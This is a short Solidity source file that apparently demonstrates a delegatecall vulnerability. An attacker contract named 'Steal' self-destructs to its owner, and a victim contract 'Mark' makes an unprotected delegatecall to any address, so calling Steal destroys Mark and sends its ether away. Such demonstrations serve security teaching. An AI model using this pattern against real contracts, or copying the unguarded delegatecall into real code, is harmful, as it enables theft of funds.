pragma solidity ^0.4.18;
contract Steal{
    address public owner;
    function Steal() public {
        owner = msg.sender;
    }
    function innocence() public {
        selfdestruct(owner);
    }
}

contract Mark {
    function queryBalance() public view returns(uint) {
        return this.balance;
     }
    function Deposit() public payable {}
    function call(address a) public{
        if(!a.delegatecall(bytes4(keccak256("innocence()"))))
            revert();
    }
}

//If Mark calls Steal, then Mark will selfdestruct.
